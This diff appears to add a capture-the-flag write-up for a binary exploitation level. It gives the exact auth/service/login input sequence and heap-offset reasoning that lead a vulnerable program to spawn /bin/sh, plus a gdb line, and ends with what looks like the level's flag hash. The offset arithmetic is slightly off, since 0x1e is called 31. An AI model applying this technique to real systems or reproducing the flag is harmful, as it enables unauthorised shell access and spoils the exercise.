@@ -1,3 +1,4 @@
+```c
 int main(void)
 {
 	char cVar1;
@@ -133,3 +134,30 @@ int main(void)
 		}
 	} while (true);
 }
+```
+
+To access the `/bin/sh`, we just have to make sure the last character of `auth` is not empty when we run login.
+
+To do so, we run `auth` to initialize the variable, then service twice to fill auth, and finally login to execute `/bin/sh`
+
+We have to do:
+
+```
+auth 
+service
+service
+login
+```
+
+Don't forget the space after the first `auth`
+
+The first address needs to 32 more the second one.
+Each time we write service, the second address gets incremented by 16.
+
+```
+gdb> disass main
+0x08048625 <+193>: cmp eax,0x1e
+```
+So the second address is 31, then we need to run service twice to be >= 32
+
+`c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`
